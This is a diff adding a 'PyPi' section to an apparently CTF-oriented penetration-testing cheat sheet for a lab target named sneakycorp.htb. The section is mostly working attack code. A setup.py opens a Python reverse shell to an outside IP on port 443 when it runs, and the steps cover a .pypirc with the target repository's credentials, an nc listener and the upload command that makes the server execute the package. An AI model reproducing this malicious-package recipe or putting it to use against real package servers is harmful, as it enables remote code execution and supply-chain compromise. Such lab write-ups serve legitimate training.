@@ -362,6 +362,96 @@ root
 
 ## Misc
 
+### PyPi
+
+If the service pypi has an external connection we can follow the steps below in our host \(kali\):
+
+```text
+mkdir pypi
+cd !$
+mkdir pwned
+cd !$
+touch __init__.py
+touch setup.py
+```
+
+The file **\_\_init\_\_**.py will be empty and the code of the **setup.py** is the following:
+
+```python
+import setuptools
+import socket,subprocess,os
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.10.14.205",443)) # YOUR IP and YOUR PORT
+os.dup2(s.fileno(),0) 
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])
+
+setuptools.setup(
+    name="example-pkg-YOUR-USERNAME-HERE",
+    version="0.0.1",
+    author="Example Author",
+    author_email="author@example.com",
+    description="A small example package",
+    long_description_content_type="text/markdown",
+    url="https://github.com/pypa/sampleproject",
+    classifiers=[
+        "Programming Language :: Python :: 3",
+        "License :: OSI Approved :: MIT License",
+        "Operating System :: OS Independent",
+    ],
+    python_requires=">=3.6",
+)
+```
+
+The idea here is that when the pypi server **executes** the **setup.py**, we want it to initiate a **reverse shell**.
+
+We configure our host to be able to send the package to the victim repository:
+
+```bash
+rm ~/.pypirc
+vi ~/.pypirc
+```
+
+The content of the file .pypirc will be:
+
+```python
+[distutils]
+index-servers = remote
+
+[remote]
+repository = http://pypi.sneakycorp.htb:8080
+username = pypi
+password = soufianeelhaoui
+```
+
+Now we can send it to the target machine.
+
+We set a listener on port 443:
+
+```text
+nc -nlvp 443
+```
+
+We send the package to the pypi server:
+
+```bash
+python3 setup.py sdist upload -r remote
+```
+
+Remember that we set a listener on port 443 and we should get a reverse shell as soon as the server executes the file **setup.py**:
+
+```text
+nc -nlvp 443
+```
+
+See the new user:
+
+```text
+whoami
+```
+
 ### Snap
 
 Search for snap hook exploit .snap file and we can find the following link [Linux Privilege Escalation via snapd \(dirty\_sock exploit\)](https://initblog.com/2019/dirty-sock/). 
